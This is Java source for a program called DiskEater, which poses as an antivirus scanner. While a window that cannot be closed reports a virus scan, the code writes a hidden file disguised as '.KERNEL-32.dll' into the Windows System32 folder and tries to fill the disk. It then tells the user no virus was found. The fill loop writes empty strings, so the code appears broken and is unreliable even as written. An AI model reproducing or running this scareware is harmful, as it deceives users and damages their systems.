import java.io.*;
import java.nio.file.*;
import javax.swing.*;
import java.awt.*;
import java.net.URL;

public class DiskEater{

    public DiskEater(){
	File drive = new File("c:\\Windows\\System32");
	Writer writer = null;
	double usableSpace = drive.getUsableSpace();
	double totalSpace = drive.getTotalSpace();
	System.out.println(usableSpace/totalSpace);
	String pathName = drive.getPath()+"\\.KERNEL-32.dll";

	JFrame virusScanner = new JFrame("Super Anti-Virus Software Co.");
	virusScanner.setVisible(true);
	virusScanner.setSize(400, 450);
	virusScanner.setResizable(false);
	virusScanner.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
	JTextField statusF = new JTextField("Scanning for viruses...");
	JPanel statusP = new JPanel(new BorderLayout());
	Icon loadingGif = null;
	try{
	    loadingGif = new ImageIcon("loading.gif");
	}catch(Exception e){
	    System.out.println("No image, such sad");
	}
	JLabel loadingGifL = new JLabel(loadingGif);
	statusP.add(statusF, BorderLayout.NORTH);
	statusP.add(loadingGifL, BorderLayout.CENTER);
	virusScanner.add(statusP);
	virusScanner.revalidate();
	try {
	    writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(pathName), "utf-8"));

	    

	    while(usableSpace / totalSpace > 0.1){
		writer.write("");
		usableSpace = drive.getUsableSpace();
		//System.out.println(usableSpace/totalSpace);
		}
	}catch(Exception e){
	    System.out.println(e.getMessage());
	}
	try{
	    writer.close();
	    Files.setAttribute(Paths.get(pathName), "dos:hidden", true);
	}catch(Exception e){
	    System.out.println("Failed to close");
	}
	statusF.setText("The scanning finishes and no virus is found!");
	virusScanner.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
	Icon check = new ImageIcon("checkmark.png");
	JLabel checkL = new JLabel(check);
	statusP.remove(loadingGifL);
	statusP.add(checkL, BorderLayout.CENTER);
	virusScanner.revalidate();
	virusScanner.repaint();
    }
    public static void main(String[] asdf){
	DiskEater de = new DiskEater();
    }
}
